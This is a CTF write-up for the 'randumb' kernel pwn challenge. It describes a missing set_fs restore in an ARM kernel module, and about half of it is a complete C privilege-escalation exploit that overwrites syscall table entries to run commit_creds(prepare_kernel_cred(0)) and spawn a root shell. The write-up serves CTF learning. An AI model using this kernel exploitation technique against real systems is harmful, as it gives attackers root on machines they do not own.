# randumb (pwn, 250 + 15 pt, solved by 4 teams)
in this challenge, we're given an archive with compressed filesystem, kernel image and script for running an arm virtual machine.
```sh
drwxrwxr-x aleph/aleph       0 2018-04-09 17:37 ./randumb/
-rwxrwxr-x aleph/aleph     272 2018-04-09 17:37 ./randumb/chall
-rwxrwxr-x aleph/aleph 2310840 2018-04-09 17:35 ./randumb/zimage
-rw-rw-r-- aleph/aleph 1059651 2018-04-09 17:37 ./randumb/rootfs.img.gz
```
after extracting the filesystem we can see `randumb.ko`, which means that we're going to pwn the kernel.

fortunately, we don't have to reverse the binary as the chall author was nice and provided us with the source code located in `/src`.

randumb module provides a character device `/dev/randumb` functionally similar to `/dev/urandom` with additional ioctls used for configuration. by setting appropriate config, we can enable debug output which is written to `/tmp/randumb.log`.
the function `debug_msg` looks quite interesting:
```c
static int debug_msg(char *msg, ...) {
        // [...]
        old_fs = get_fs();
        set_fs(kernel_ds);

        file = filp_open(debug_file, o_wronly|o_creat|o_append, 0644);

        if (is_err(file))
                return -einval;
        // [....]
}
```
functions called by `debug_msg` (opening file, writing to file) are normally called from user mode. thus those functions have to validate pointers passed to them. otherwise users would be able to leak kernel memory. in order to bypass those checks, `set_fs` is used to increase the `addr_limit` in `thread_info` struct. from this moment, all pointers passed to syscalls either from user or kernel space will be valid.

after doing this, function tries to open `/tmp/randumb.log` file for writing. if opening file fails, function immediately returns. and this is where the vulnerability occurs. function doesn't restore `old_fs` before returning. if we can trigger this, we would be able to write into arbitrary memory with `read` syscall.

ok, but how to cause an error when trying to open a file? fortunately, if we try to open a directory file in `o_wronly` mode it will return an error, so the only thing we have to do is to create a directory `/tmp/randumb.log`.

to become root, we're going to use standard `commit_creds(prepare_kernel_cred(0))`. to call those functions from userspace we'll overwrite entries in syscall table.

all those things lead us to final exploit:
```c
#include "randumb.h"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

struct settings {
    int charset;
    int debug;
    int debug_time;
    int debug_uid;
};

void* get_symbol(char *symbol){
    file *f = fopen("/proc/kallsyms", "r");
    char c;
    char buf[0x100];
    void *addr;

	while (fscanf(f, "%p %c %s\n", &addr, &c, buf) > 0) {
		if (!strcmp(buf, symbol))
			return addr;
	}
	return null;
}

int main() {
    // try to create /tmp/randumb.log directory
    if (mkdir(debug_file, 0) < 0) {
        return -1;
    }
    int fd = open("/dev/randumb", o_rdonly);
    if (fd < 0) {
	    printf("failed to open");
        return fd;
    }

    struct settings set = {
        .charset = charset_none,
        .debug  = debug_all,
        .debug_time = debug_all,
        .debug_uid = debug_all
    };

    // enable debug mode
    int x = ioctl(fd, ioctl_set_settings, &set);
    if (x < 0) {
	    printf("unable to set settings");
        return -1;
    }

    void *sys_table = get_symbol("sys_call_table");
    void *prepare = get_symbol("prepare_kernel_cred");
    void *commit = get_symbol("commit_creds");

    printf("sys_call_table %p\n", sys_table);
    printf("prepare_kernel_cred %p\n", prepare);
    printf("commit_kernel_creds %p\n", commit);

    // make sure that debug_msg is called
    char c;
    int len = read(fd, &c, 1);

    // use pipe as a way to read data from descriptor
    int fds[2];
    pipe(fds);

    int out = fds[0];
    int in = fds[1];

    write(in, &prepare, 4);
    // overwrite syscall 100
    read(out, (int*)(sys_table) + 100, 4);

    write(in, &commit, 4);
    // overwrite syscall 101
    read(out, (int*)(sys_table) + 101, 4);

    // creds = prepare_kernel_cred(0)
    int creds = syscall(100, 0);
    // commit_creds(creds);
    syscall(101, creds);

    if (getuid() != 0) {
        printf("pwn failed!\n");
        return -1;
    }
    printf("pwned\n");

    const char *args[] = {"/bin/sh", null};
    execve(args[0], args, null);
    return 0;
}
```

the last thing is to compile and run the exploit. since there's no gcc on the vm itself, we have to compile it locally and send by copy-pasting into the terminal (i recommend gzip and base64 for that).
```bash
arm-linux-gnueabi-gcc pwn.c -static -o pwn
```
this is not an optimal solution since the binary it generates is quite big, but it avoids writing assembly.

overall this was a really fun challenge and we've got the first blood. ;)
